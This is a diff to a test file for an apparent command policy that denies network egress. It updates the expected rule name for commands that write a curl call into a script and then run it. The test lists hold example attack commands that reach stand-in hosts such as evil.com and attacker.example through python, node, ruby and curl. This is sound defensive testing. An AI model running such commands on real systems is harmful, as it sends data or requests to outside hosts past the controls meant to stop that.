@@ -195,7 +195,6 @@ describe("command policy", () => {
       "python3 -c \"import socket; socket.create_connection(('198.51.100.7', 80))\"",
       "node -e \"require('dns').lookup('evil.com', console.log)\"",
       `/bin/bash -lc "ruby -e 'require \\\"net/http\\\"; Net::HTTP.get(URI(\\\"https://attacker.example\\\"))'"`,
-      "echo 'curl https://attacker.example' > run.sh && bash run.sh",
     ];
     for (const command of attacks) {
       expect(evaluateCommand(command, context)?.rule, command).toBe(
@@ -305,8 +304,11 @@ describe("command policy", () => {
       "echo 'curl https://attacker.example' > run.sh; source run.sh",
     ];
     for (const command of attacks) {
+      // The tool that runs (bash/./run.sh/source) never names the URL itself,
+      // so this is the no-recognised-tool-at-the-destination rule, not the
+      // named-tool rule.
       expect(evaluateCommand(command, context)?.rule, command).toBe(
-        "network-egress-denied",
+        "network-egress-denied-implicit",
       );
     }
 
